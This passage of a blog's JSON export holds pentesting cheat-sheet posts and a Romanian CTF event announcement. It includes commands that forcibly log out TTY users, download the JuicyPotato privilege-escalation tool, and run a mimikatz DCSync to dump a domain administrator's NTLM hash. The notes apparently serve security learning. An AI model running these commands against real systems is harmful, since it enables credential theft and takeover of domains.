-u\n<span class=\"comment\"># mock them before you kick them out</span>\n(<span class=\"built_in\">echo</span> <span class=\"string\">&quot;And now... you are gone&quot;</span> | write <span class=\"variable\">$user</span> <span class=\"variable\">$tty</span>) &amp;&amp; <span class=\"built_in\">sleep</span> 10\n<span class=\"comment\"># kill the tty pid</span>\n<span class=\"built_in\">kill</span> -9 <span class=\"variable\">$pid</span></code></pre>\n\n<p>Remove ability to view output for commands</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">exec</span> &gt;/dev/null</code></pre>\n<pre><div class=\"caption\"><span>enable output</span></div><code class=\"highlight bash\"><span class=\"built_in\">exec</span> &gt;/dev/tty</code></pre>\n\n<br>\n\n<h2 id=\"Files\"><a href=\"#Files\" class=\"headerlink\" title=\"Files\"></a>Files</h2><p>View recently modified files</p>\n<pre><div class=\"caption\"><span>created or modified in the last 5 days</span></div><code class=\"highlight bash\">find / -mtime -5 -o -ctime -5 2&gt;/dev/null</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"ixodron 2024 - CTF","date":"2024-09-03T05:00:00.000Z","toc":true,"_content":"\n---\n\n> **Ce este un CTF, de ce l folosim, cum vei juca i ce vei nva.**\n\n---\n\n<!-- more -->\n\n<br>\n\n## Ce este un CTF?\n\nCTF (Capture The Flag) este o competiie de securitate cibernetic, care testeaz abiliti din diverse domenii ale informaticii i proteciei datelor. Participanii i utilizeaz cunotinele tehnice pentru a rezolva o serie de provocri, avnd ca scop final capturarea unor flag-uri (indicatoare virtuale).\n\n\n- **Format**: CTF-urile sunt competiii asemntoare unui joc de tip puzzle, unde participanii trebuie s rezolve provocri specifice pentru a obine puncte i a avansa.\n- **Categorii**: Provocrile acoper domenii diverse, cum ar fi `criptografia`, `exploatarea web`, `networking`, `steganografia`, `ingineria invers`, `programarea`, `OSINT`, `Linux`, `Windows`, `exploatarea binar`, i altele.\n- **Durat**: Competiiile variaz ca durat, de la cteva ore la cteva zile.\n- **Punctaj**: Exerciiile sunt de obicei punctate dinamic, ceea ce nseamn c punctajul pentru fiecare exerciiu poate varia n funcie de dificultate i de numrul de echipe care l rezolv.\n\n\n<br>\n\n## Descrierea CTF-ului ixodron 2024 ixo - CTF\n\nCTF-ul va avea loc n a doua zi a evenimentului ixo  CTF i este deschis tuturor participanilor, indiferent de nivelul de cunotine n securitate cibernetic. Scopul principal este de **stimularea curiozitii** i ncurajarea nvrii prin **experimentare i perseveren**.\n\n<br>\n\n### Obiectivele CTF-ului\n\nAcest CTF <u>nu este conceput pentru a testa cunotinele avansate de securitate cibernetic</u>. n schimb, se concentreaz pe testarea abilitilor de networking i pe utilizarea informaiilor prezentate n demo-urile pregtite i demonstrate anterior. De asemenea, vei ntlni provocri simple de securitate cibernetic, pentru care rspunsurile pot fi gsite pe internet.\n\n**Este esenial s subliniem curiozitatea i persistena:**\n- Nu este necesar s cunoatei toate rspunsurile dinainte.\n- Este normal s nvai mai multe lucruri pe parcursul competiiei dect tiai nainte, iar aceasta este partea captivant!\n- Curiozitatea de a explora, persistena de a nu renuna la prima dificultate i dorina de a nva vor fi cheile succesului vostru.\n\n\n<br>\n\n### Detalii despre eveniment\n\n- **Data**: A doua zi a conferinei, 03.10.2024\n- **Locaia**: [Sediul ALEF, Bulevardul Dimitrie Pompeiu, nr. 6E, cldirea Pipera Business Tower, et. 8](https://maps.app.goo.gl/UT8fBvJhVJKecEhH6)\n- **Link**: https://ixodron-ctf.chronossec.site\n- **Durat**: 09:30 - 16:00\n- **Numr de exerciii**: 24\n    - **Categorii**:\n        - Criptografie: 4\n        - Forensics: 4\n        - Linux: 4\n        - Web: 6\n        - Networking: 4\n        - Windows: 2\n\n<br>\n\n### Cum s participai\n\n- **Echipe**: formate din cte 3 participani \n- **Autentificare**: https://ixodron-ctf.chronossec.site/register\n- **Flag-uri**: Flag-urile (indicatoarele) vor fi n formatul `IXODRON{mesaj}`; cutai s gsii un rspuns ce conine `IXODRON` \n\n<br>\n\n### Prerechizite\n\nPentru a participa, ixodron v-a pregtit urmtoarele:\n\n- **Computer cu Sistem de Operare Windows**.\n- **Aplicaie de virtualizare**: Oracle VM VirtualBox.\n- **Main virtual Kali Linux** instalat cu urmtoarele configuraii de reea:\n  - **Adaptor 1**: NAT\n  - **Adaptor 2**: Host-only\n- **Conexiune la internet**: Prin cablu i/sau WiFi.\n\n<br>\n\n### Asisten din partea organizatorilor\n\nOrganizatorii vor fi disponibili pentru asisten tehnic i ntrebri pe toat durata exerciiului CTF. \n\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>V ateptm la CTF!</b>\n</p>\n\n---\n---","source":"_posts/CTFs/ixodron/ctf.md","raw":"---\ntitle: ixodron 2024 - CTF\ndate: 2024-09-03 08:00:00\ncategories:\n  - CTFs\n  - ixodron 2024\n  - 3. CTF\ntags:\n  - CTFs\n  - ixodron 2024\n  - CTF\ntoc: True\n---\n\n---\n\n> **Ce este un CTF, de ce l folosim, cum vei juca i ce vei nva.**\n\n---\n\n<!-- more -->\n\n<br>\n\n## Ce este un CTF?\n\nCTF (Capture The Flag) este o competiie de securitate cibernetic, care testeaz abiliti din diverse domenii ale informaticii i proteciei datelor. Participanii i utilizeaz cunotinele tehnice pentru a rezolva o serie de provocri, avnd ca scop final capturarea unor flag-uri (indicatoare virtuale).\n\n\n- **Format**: CTF-urile sunt competiii asemntoare unui joc de tip puzzle, unde participanii trebuie s rezolve provocri specifice pentru a obine puncte i a avansa.\n- **Categorii**: Provocrile acoper domenii diverse, cum ar fi `criptografia`, `exploatarea web`, `networking`, `steganografia`, `ingineria invers`, `programarea`, `OSINT`, `Linux`, `Windows`, `exploatarea binar`, i altele.\n- **Durat**: Competiiile variaz ca durat, de la cteva ore la cteva zile.\n- **Punctaj**: Exerciiile sunt de obicei punctate dinamic, ceea ce nseamn c punctajul pentru fiecare exerciiu poate varia n funcie de dificultate i de numrul de echipe care l rezolv.\n\n\n<br>\n\n## Descrierea CTF-ului ixodron 2024 ixo - CTF\n\nCTF-ul va avea loc n a doua zi a evenimentului ixo  CTF i este deschis tuturor participanilor, indiferent de nivelul de cunotine n securitate cibernetic. Scopul principal este de **stimularea curiozitii** i ncurajarea nvrii prin **experimentare i perseveren**.\n\n<br>\n\n### Obiectivele CTF-ului\n\nAcest CTF <u>nu este conceput pentru a testa cunotinele avansate de securitate cibernetic</u>. n schimb, se concentreaz pe testarea abilitilor de networking i pe utilizarea informaiilor prezentate n demo-urile pregtite i demonstrate anterior. De asemenea, vei ntlni provocri simple de securitate cibernetic, pentru care rspunsurile pot fi gsite pe internet.\n\n**Este esenial s subliniem curiozitatea i persistena:**\n- Nu este necesar s cunoatei toate rspunsurile dinainte.\n- Este normal s nvai mai multe lucruri pe parcursul competiiei dect tiai nainte, iar aceasta este partea captivant!\n- Curiozitatea de a explora, persistena de a nu renuna la prima dificultate i dorina de a nva vor fi cheile succesului vostru.\n\n\n<br>\n\n### Detalii despre eveniment\n\n- **Data**: A doua zi a conferinei, 03.10.2024\n- **Locaia**: [Sediul ALEF, Bulevardul Dimitrie Pompeiu, nr. 6E, cldirea Pipera Business Tower, et. 8](https://maps.app.goo.gl/UT8fBvJhVJKecEhH6)\n- **Link**: https://ixodron-ctf.chronossec.site\n- **Durat**: 09:30 - 16:00\n- **Numr de exerciii**: 24\n    - **Categorii**:\n        - Criptografie: 4\n        - Forensics: 4\n        - Linux: 4\n        - Web: 6\n        - Networking: 4\n        - Windows: 2\n\n<br>\n\n### Cum s participai\n\n- **Echipe**: formate din cte 3 participani \n- **Autentificare**: https://ixodron-ctf.chronossec.site/register\n- **Flag-uri**: Flag-urile (indicatoarele) vor fi n formatul `IXODRON{mesaj}`; cutai s gsii un rspuns ce conine `IXODRON` \n\n<br>\n\n### Prerechizite\n\nPentru a participa, ixodron v-a pregtit urmtoarele:\n\n- **Computer cu Sistem de Operare Windows**.\n- **Aplicaie de virtualizare**: Oracle VM VirtualBox.\n- **Main virtual Kali Linux** instalat cu urmtoarele configuraii de reea:\n  - **Adaptor 1**: NAT\n  - **Adaptor 2**: Host-only\n- **Conexiune la internet**: Prin cablu i/sau WiFi.\n\n<br>\n\n### Asisten din partea organizatorilor\n\nOrganizatorii vor fi disponibili pentru asisten tehnic i ntrebri pe toat durata exerciiului CTF. \n\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>V ateptm la CTF!</b>\n</p>\n\n---\n---","slug":"CTFs/ixodron/ctf","published":1,"updated":"2024-09-23T06:18:55.849Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhx000y6gvgfpyy5lvs","content":"<hr>\n<blockquote>\n<p><strong>Ce este un CTF, de ce l folosim, cum vei juca i ce vei nva.</strong></p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Ce-este-un-CTF\"><a href=\"#Ce-este-un-CTF\" class=\"headerlink\" title=\"Ce este un CTF?\"></a>Ce este un CTF?</h2><p>CTF (Capture The Flag) este o competiie de securitate cibernetic, care testeaz abiliti din diverse domenii ale informaticii i proteciei datelor. Participanii i utilizeaz cunotinele tehnice pentru a rezolva o serie de provocri, avnd ca scop final capturarea unor flag-uri (indicatoare virtuale).</p>\n<ul>\n<li><strong>Format</strong>: CTF-urile sunt competiii asemntoare unui joc de tip puzzle, unde participanii trebuie s rezolve provocri specifice pentru a obine puncte i a avansa.</li>\n<li><strong>Categorii</strong>: Provocrile acoper domenii diverse, cum ar fi <code>criptografia</code>, <code>exploatarea web</code>, <code>networking</code>, <code>steganografia</code>, <code>ingineria invers</code>, <code>programarea</code>, <code>OSINT</code>, <code>Linux</code>, <code>Windows</code>, <code>exploatarea binar</code>, i altele.</li>\n<li><strong>Durat</strong>: Competiiile variaz ca durat, de la cteva ore la cteva zile.</li>\n<li><strong>Punctaj</strong>: Exerciiile sunt de obicei punctate dinamic, ceea ce nseamn c punctajul pentru fiecare exerciiu poate varia n funcie de dificultate i de numrul de echipe care l rezolv.</li>\n</ul>\n<br>\n\n<h2 id=\"Descrierea-CTF-ului-ixodron-2024-ixo-CTF\"><a href=\"#Descrierea-CTF-ului-ixodron-2024-ixo-CTF\" class=\"headerlink\" title=\"Descrierea CTF-ului ixodron 2024 ixo - CTF\"></a>Descrierea CTF-ului ixodron 2024 ixo - CTF</h2><p>CTF-ul va avea loc n a doua zi a evenimentului ixo  CTF i este deschis tuturor participanilor, indiferent de nivelul de cunotine n securitate cibernetic. Scopul principal este de <strong>stimularea curiozitii</strong> i ncurajarea nvrii prin <strong>experimentare i perseveren</strong>.</p>\n<br>\n\n<h3 id=\"Obiectivele-CTF-ului\"><a href=\"#Obiectivele-CTF-ului\" class=\"headerlink\" title=\"Obiectivele CTF-ului\"></a>Obiectivele CTF-ului</h3><p>Acest CTF <u>nu este conceput pentru a testa cunotinele avansate de securitate cibernetic</u>. n schimb, se concentreaz pe testarea abilitilor de networking i pe utilizarea informaiilor prezentate n demo-urile pregtite i demonstrate anterior. De asemenea, vei ntlni provocri simple de securitate cibernetic, pentru care rspunsurile pot fi gsite pe internet.</p>\n<p><strong>Este esenial s subliniem curiozitatea i persistena:</strong></p>\n<ul>\n<li>Nu este necesar s cunoatei toate rspunsurile dinainte.</li>\n<li>Este normal s nvai mai multe lucruri pe parcursul competiiei dect tiai nainte, iar aceasta este partea captivant!</li>\n<li>Curiozitatea de a explora, persistena de a nu renuna la prima dificultate i dorina de a nva vor fi cheile succesului vostru.</li>\n</ul>\n<br>\n\n<h3 id=\"Detalii-despre-eveniment\"><a href=\"#Detalii-despre-eveniment\" class=\"headerlink\" title=\"Detalii despre eveniment\"></a>Detalii despre eveniment</h3><ul>\n<li><strong>Data</strong>: A doua zi a conferinei, 03.10.2024</li>\n<li><strong>Locaia</strong>: <a href=\"https://maps.app.goo.gl/UT8fBvJhVJKecEhH6\">Sediul ALEF, Bulevardul Dimitrie Pompeiu, nr. 6E, cldirea Pipera Business Tower, et. 8</a></li>\n<li><strong>Link</strong>: <a href=\"https://ixodron-ctf.chronossec.site/\">https://ixodron-ctf.chronossec.site</a></li>\n<li><strong>Durat</strong>: 09:30 - 16:00</li>\n<li><strong>Numr de exerciii</strong>: 24<ul>\n<li><strong>Categorii</strong>:<ul>\n<li>Criptografie: 4</li>\n<li>Forensics: 4</li>\n<li>Linux: 4</li>\n<li>Web: 6</li>\n<li>Networking: 4</li>\n<li>Windows: 2</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<br>\n\n<h3 id=\"Cum-sa-participati\"><a href=\"#Cum-sa-participati\" class=\"headerlink\" title=\"Cum s participai\"></a>Cum s participai</h3><ul>\n<li><strong>Echipe</strong>: formate din cte 3 participani </li>\n<li><strong>Autentificare</strong>: <a href=\"https://ixodron-ctf.chronossec.site/register\">https://ixodron-ctf.chronossec.site/register</a></li>\n<li><strong>Flag-uri</strong>: Flag-urile (indicatoarele) vor fi n formatul <code>IXODRON&#123;mesaj&#125;</code>; cutai s gsii un rspuns ce conine <code>IXODRON</code></li>\n</ul>\n<br>\n\n<h3 id=\"Prerechizite\"><a href=\"#Prerechizite\" class=\"headerlink\" title=\"Prerechizite\"></a>Prerechizite</h3><p>Pentru a participa, ixodron v-a pregtit urmtoarele:</p>\n<ul>\n<li><strong>Computer cu Sistem de Operare Windows</strong>.</li>\n<li><strong>Aplicaie de virtualizare</strong>: Oracle VM VirtualBox.</li>\n<li><strong>Main virtual Kali Linux</strong> instalat cu urmtoarele configuraii de reea:<ul>\n<li><strong>Adaptor 1</strong>: NAT</li>\n<li><strong>Adaptor 2</strong>: Host-only</li>\n</ul>\n</li>\n<li><strong>Conexiune la internet</strong>: Prin cablu i&#x2F;sau WiFi.</li>\n</ul>\n<br>\n\n<h3 id=\"Asistenta-din-partea-organizatorilor\"><a href=\"#Asistenta-din-partea-organizatorilor\" class=\"headerlink\" title=\"Asisten din partea organizatorilor\"></a>Asisten din partea organizatorilor</h3><p>Organizatorii vor fi disponibili pentru asisten tehnic i ntrebri pe toat durata exerciiului CTF. </p>\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>V ateptm la CTF!</b>\n</p>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p><strong>Ce este un CTF, de ce l folosim, cum vei juca i ce vei nva.</strong></p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"Ce-este-un-CTF\"><a href=\"#Ce-este-un-CTF\" class=\"headerlink\" title=\"Ce este un CTF?\"></a>Ce este un CTF?</h2><p>CTF (Capture The Flag) este o competiie de securitate cibernetic, care testeaz abiliti din diverse domenii ale informaticii i proteciei datelor. Participanii i utilizeaz cunotinele tehnice pentru a rezolva o serie de provocri, avnd ca scop final capturarea unor flag-uri (indicatoare virtuale).</p>\n<ul>\n<li><strong>Format</strong>: CTF-urile sunt competiii asemntoare unui joc de tip puzzle, unde participanii trebuie s rezolve provocri specifice pentru a obine puncte i a avansa.</li>\n<li><strong>Categorii</strong>: Provocrile acoper domenii diverse, cum ar fi <code>criptografia</code>, <code>exploatarea web</code>, <code>networking</code>, <code>steganografia</code>, <code>ingineria invers</code>, <code>programarea</code>, <code>OSINT</code>, <code>Linux</code>, <code>Windows</code>, <code>exploatarea binar</code>, i altele.</li>\n<li><strong>Durat</strong>: Competiiile variaz ca durat, de la cteva ore la cteva zile.</li>\n<li><strong>Punctaj</strong>: Exerciiile sunt de obicei punctate dinamic, ceea ce nseamn c punctajul pentru fiecare exerciiu poate varia n funcie de dificultate i de numrul de echipe care l rezolv.</li>\n</ul>\n<br>\n\n<h2 id=\"Descrierea-CTF-ului-ixodron-2024-ixo-CTF\"><a href=\"#Descrierea-CTF-ului-ixodron-2024-ixo-CTF\" class=\"headerlink\" title=\"Descrierea CTF-ului ixodron 2024 ixo - CTF\"></a>Descrierea CTF-ului ixodron 2024 ixo - CTF</h2><p>CTF-ul va avea loc n a doua zi a evenimentului ixo  CTF i este deschis tuturor participanilor, indiferent de nivelul de cunotine n securitate cibernetic. Scopul principal este de <strong>stimularea curiozitii</strong> i ncurajarea nvrii prin <strong>experimentare i perseveren</strong>.</p>\n<br>\n\n<h3 id=\"Obiectivele-CTF-ului\"><a href=\"#Obiectivele-CTF-ului\" class=\"headerlink\" title=\"Obiectivele CTF-ului\"></a>Obiectivele CTF-ului</h3><p>Acest CTF <u>nu este conceput pentru a testa cunotinele avansate de securitate cibernetic</u>. n schimb, se concentreaz pe testarea abilitilor de networking i pe utilizarea informaiilor prezentate n demo-urile pregtite i demonstrate anterior. De asemenea, vei ntlni provocri simple de securitate cibernetic, pentru care rspunsurile pot fi gsite pe internet.</p>\n<p><strong>Este esenial s subliniem curiozitatea i persistena:</strong></p>\n<ul>\n<li>Nu este necesar s cunoatei toate rspunsurile dinainte.</li>\n<li>Este normal s nvai mai multe lucruri pe parcursul competiiei dect tiai nainte, iar aceasta este partea captivant!</li>\n<li>Curiozitatea de a explora, persistena de a nu renuna la prima dificultate i dorina de a nva vor fi cheile succesului vostru.</li>\n</ul>\n<br>\n\n<h3 id=\"Detalii-despre-eveniment\"><a href=\"#Detalii-despre-eveniment\" class=\"headerlink\" title=\"Detalii despre eveniment\"></a>Detalii despre eveniment</h3><ul>\n<li><strong>Data</strong>: A doua zi a conferinei, 03.10.2024</li>\n<li><strong>Locaia</strong>: <a href=\"https://maps.app.goo.gl/UT8fBvJhVJKecEhH6\">Sediul ALEF, Bulevardul Dimitrie Pompeiu, nr. 6E, cldirea Pipera Business Tower, et. 8</a></li>\n<li><strong>Link</strong>: <a href=\"https://ixodron-ctf.chronossec.site/\">https://ixodron-ctf.chronossec.site</a></li>\n<li><strong>Durat</strong>: 09:30 - 16:00</li>\n<li><strong>Numr de exerciii</strong>: 24<ul>\n<li><strong>Categorii</strong>:<ul>\n<li>Criptografie: 4</li>\n<li>Forensics: 4</li>\n<li>Linux: 4</li>\n<li>Web: 6</li>\n<li>Networking: 4</li>\n<li>Windows: 2</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<br>\n\n<h3 id=\"Cum-sa-participati\"><a href=\"#Cum-sa-participati\" class=\"headerlink\" title=\"Cum s participai\"></a>Cum s participai</h3><ul>\n<li><strong>Echipe</strong>: formate din cte 3 participani </li>\n<li><strong>Autentificare</strong>: <a href=\"https://ixodron-ctf.chronossec.site/register\">https://ixodron-ctf.chronossec.site/register</a></li>\n<li><strong>Flag-uri</strong>: Flag-urile (indicatoarele) vor fi n formatul <code>IXODRON&#123;mesaj&#125;</code>; cutai s gsii un rspuns ce conine <code>IXODRON</code></li>\n</ul>\n<br>\n\n<h3 id=\"Prerechizite\"><a href=\"#Prerechizite\" class=\"headerlink\" title=\"Prerechizite\"></a>Prerechizite</h3><p>Pentru a participa, ixodron v-a pregtit urmtoarele:</p>\n<ul>\n<li><strong>Computer cu Sistem de Operare Windows</strong>.</li>\n<li><strong>Aplicaie de virtualizare</strong>: Oracle VM VirtualBox.</li>\n<li><strong>Main virtual Kali Linux</strong> instalat cu urmtoarele configuraii de reea:<ul>\n<li><strong>Adaptor 1</strong>: NAT</li>\n<li><strong>Adaptor 2</strong>: Host-only</li>\n</ul>\n</li>\n<li><strong>Conexiune la internet</strong>: Prin cablu i&#x2F;sau WiFi.</li>\n</ul>\n<br>\n\n<h3 id=\"Asistenta-din-partea-organizatorilor\"><a href=\"#Asistenta-din-partea-organizatorilor\" class=\"headerlink\" title=\"Asisten din partea organizatorilor\"></a>Asisten din partea organizatorilor</h3><p>Organizatorii vor fi disponibili pentru asisten tehnic i ntrebri pe toat durata exerciiului CTF. </p>\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>V ateptm la CTF!</b>\n</p>\n\n<hr>\n<hr>"},{"title":"1. Preparation - Windows","toc":true,"_content":"\n---\nStep 1 in a penetration test: Preparation.\nInstall the necessary tools, prepare scripts and the working environment.\n\n---\n<!-- more -->\n\n<br>\n\n```bash Create a dedicated directory (stay organized)\nmkdir -p ~/tools\n```\n\n## Pentesting tools\n```bash JuiciPotato.exe - privesc from service acc to system\nwget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe ~/tools/JuicyPotato.exe\n```\n\n```bash Responder\nsudo apt install responder\n```\n\n```bash crackmapexec - Swiss Army knife for Win/AD environments\nsudo apt install crackmapexec\n```\n\n```bash evilwinrm - WinRM shell\nsudo apt install evil-winrm\n```\n\n<br> \n\nBloodHound and SharpHound\n```bash BloodHound\nsudo apt install neo4j\n\nneo4j start\n# fresh start (or forgotten password)\nsudo rm -rf /usr/share/neo4j/data/dbms/auth\nneo4j console\n```\n```batch collect data with SharpHound (maybe share the binary in a SMB share)\n\\\\10.10.10.10\\share> .\\SharpHound.exe\n```\n```bash Import the zip archive created into BloodHound\n...\n```\n\n<br>\n\n```bash Mimikatz\n# download the latest release and upload the 64-bit binary \n# https://github.com/gentilkiwi/mimikatz/releases/latest\n\n.\\mimikatz 'lsadump::dcsync /domain:DOMAIN.LOCAL /user:administrator' exit\n# NTLM hash\n```\n\n<br>\n\n## Other tools\n```batch sqlcmd (windows)\nwinget install sqlcmd\n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/1.md","raw":"---\ntitle: 1. Preparation - Windows\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\n  - Preparation\ntoc: true\n---\n\n---\nStep 1 in a penetration test: Preparation.\nInstall the necessary tools, prepare scripts and the working environment.\n\n---\n<!-- more -->\n\n<br>\n\n```bash Create a dedicated directory (stay organized)\nmkdir -p ~/tools\n```\n\n## Pentesting tools\n```bash JuiciPotato.exe - privesc from service acc to system\nwget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe ~/tools/JuicyPotato.exe\n```\n\n```bash Responder\nsudo apt install responder\n```\n\n```bash crackmapexec - Swiss Army knife for Win/AD environments\nsudo apt install crackmapexec\n```\n\n```bash evilwinrm - WinRM shell\nsudo apt install evil-winrm\n```\n\n<br> \n\nBloodHound and SharpHound\n```bash BloodHound\nsudo apt install neo4j\n\nneo4j start\n# fresh start (or forgotten password)\nsudo rm -rf /usr/share/neo4j/data/dbms/auth\nneo4j console\n```\n```batch collect data with SharpHound (maybe share the binary in a SMB share)\n\\\\10.10.10.10\\share> .\\SharpHound.exe\n```\n```bash Import the zip archive created into BloodHound\n...\n```\n\n<br>\n\n```bash Mimikatz\n# download the latest release and upload the 64-bit binary \n# https://github.com/gentilkiwi/mimikatz/releases/latest\n\n.\\mimikatz 'lsadump::dcsync /domain:DOMAIN.LOCAL /user:administrator' exit\n# NTLM hash\n```\n\n<br>\n\n## Other tools\n```batch sqlcmd (windows)\nwinget install sqlcmd\n```\n\n<br>\n\n---\n---","slug":"Pentesting/Windows/1","published":1,"date":"2024-09-23T06:18:55.868Z","updated":"2024-09-23T06:18:55.868Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhy00106gvg4sau0i1k","content":"<hr>\n<p>Step 1 in a penetration test: Preparation.<br>Install the necessary tools, prepare scripts and the working environment.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<pre><div class=\"caption\"><span>Create a dedicated directory (stay organized)</span></div><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p ~/tools</code></pre>\n\n<h2 id=\"Pentesting-tools\"><a href=\"#Pentesting-tools\" class=\"headerlink\" title=\"Pentesting tools\"></a>Pentesting tools</h2><pre><div class=\"caption\"><span>JuiciPotato.exe - privesc from service acc to system</span></div><code class=\"highlight bash\">wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe ~/tools/JuicyPotato.exe</code></pre>\n\n<pre><div class=\"caption\"><span>Responder</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install responder</code></pre>\n\n<pre><div class=\"caption\"><span>crackmapexec - Swiss Army knife for Win/AD environments</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install crackmapexec</code></pre>\n\n<pre><div class=\"caption\"><span>evilwinrm - WinRM shell</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install evil-winrm</code></pre>\n\n<br> \n\n<p>BloodHound and SharpHound</p>\n<pre><div class=\"caption\"><span>BloodHound</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install neo4j\n\nneo4j start\n<span class=\"comment\"># fresh start (or forgotten password)</span>\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">rm</span> -rf /usr/share/neo4j/data/dbms/auth\nneo4j console</code></pre>\n<pre><div class=\"caption\"><span>collect data with SharpHound (maybe share the binary in a SMB share)</span></div><code class=\"highlight batch\">\\\\10.10.10.10\\share&gt; .\\SharpHound.exe</code></pre>\n<pre><div class=\"caption\"><span>Import the zip archive created into BloodHound</span></div><code class=\"highlight bash\">...</code></pre>\n\n<br>\n\n<pre><div class=\"caption\"><span>Mimikatz</span></div><code class=\"highlight bash\"><span class=\"comment\"># download the latest release and upload the 64-bit binary </span>\n<span class=\"comment\"># https://github.com/gentilkiwi/mimikatz/releases/latest</span>\n\n.\\mimikatz <span class=\"string\">&#x27;lsadump::dcsync /domain:DOMAIN.LOCAL /user:administrator&#x27;</span> <span class=\"built_in\">exit</span>\n<span class=\"comment\"># NTLM hash</span></code></pre>\n\n<br>\n\n<h2 id=\"Other-tools\"><a href=\"#Other-tools\" class=\"headerlink\" title=\"Other tools\"></a>Other tools</h2><pre><div class=\"caption\"><span>sqlcmd (windows)</span></div><code class=\"highlight batch\">winget install sqlcmd</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 1 in a penetration test: Preparation.<br>Install the necessary tools, prepare scripts and the working environment.</p>\n<hr>","more":"<br>\n\n<pre><div class=\"caption\"><span>Create a dedicated directory (stay organized)</span></div><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p ~/tools</code></pre>\n\n<h2 id=\"Pentesting-tools\"><a href=\"#Pentesting-tools\" class=\"headerlink\" title=\"Pentesting tools\"></a>Pentesting tools</h2><pre><div class=\"caption\"><span>JuiciPotato.exe - privesc from service acc to system</span></div><code class=\"highlight bash\">wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe ~/tools/JuicyPotato.exe</code></pre>\n\n<pre><div class=\"caption\"><span>Responder</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install responder</code></pre>\n\n<pre><div class=\"caption\"><span>crackmapexec - Swiss Army knife for Win/AD environments</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install crackmapexec</code></pre>\n\n<pre><div class=\"caption\"><span>evilwinrm - WinRM shell</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install evil-winrm</code></pre>\n\n<br> \n\n<p>BloodHound and SharpHound</p>\n<pre><div class=\"caption\"><span>BloodHound</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install neo4j\n\nneo4j start\n<span class=\"comment\"># fresh start (or forgotten password)</span>\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">rm</span> -rf /usr/share/neo4j/data/dbms/auth\nneo4j console</code></pre>\n<pre><div class=\"caption\"><span>collect data with SharpHound (maybe share the binary in a SMB share)</span></div><code class=\"highlight batch\">\\\\10.10.10.10\\share&gt; .\\SharpHound.exe</code></pre>\n<pre><div class=\"caption\"><span>Import the zip archive created into BloodHound</span></div><code class=\"highlight bash\">...</code></pre>\n\n<br>\n\n<pre><div class=\"caption\"><span>Mimikatz</span></div><code class=\"highlight bash\"><span class=\"comment\"># download the latest release and upload the 64-bit binary </span>\n<span class=\"comment\"># https://github.com/gentilkiwi/mimikatz/releases/latest</span>\n\n.\\mimikatz <span class=\"string\">&#x27;lsadump::dcsync /domain:DOMAIN.LOCAL /user:administrator&#x27;</span> <span class=\"built_in\">exit</span>\n<span class=\"comment\"># NTLM hash</span></code></pre>\n\n<br>\n\n<h2 id=\"Other-tools\"><a href=\"#Other-tools\" class=\"headerlink\" title=\"Other tools\"></a>Other tools</h2><pre><div class=\"caption\"><span>sqlcmd (windows)</span></div><code class=\"highlight batch\">winget install sqlcmd</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"2. Reconnaissance - Windows","toc":true,"_content":"\n---\nStep 2 in a penetration test: Reconnaissance.\nNetwork (for singe and multiple hosts) and OSINT recon.\n\n---\n<!-- more -->\n\n<br>\n\n\n\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/2.md","raw":"---\ntitle: 2. Reconnaissance - Windows\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\n  - Reconnaissance\ntoc: true\n---\n\n---\nStep 2 in a penetration test: Reconnaissance.\nNetwork (for singe and multiple hosts) and OSINT recon.\n\n---\n<!-- more -->\n\n<br>\n\n\n\n\n<br>\n\n---\n---","slug":"Pentesting/Windows/2","published":1,"date":"2024-09-23T06:18:55.869Z","updated":"2024-09-23T06:18:55.869Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhz00126gvg66j24kvq","content":"<hr>\n<p>Step 2 in a penetration test: Reconnaissance.<br>Network (for singe and multiple hosts) and OSINT recon.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n\n\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 2 in a penetration test: Reconnaissance.<br>Network (for singe and multiple hosts) and OSINT recon.</p>\n<hr>","more":"<br>\n\n\n\n\n<br>\n\n<hr>\n<hr>"},{"title":"3. Enumeration - Windows","toc":true,"_content":"\n---\nStep 3 in a penetration test: Enumeration.\nTry to find relevant info to enter the target machine.\n\n---\n<!-- more -->\n\n## Active Directory\n\n### Impacket scripts\n\n#### GetADUsers.py\n  - gather data about the domain's users and their corresponding email 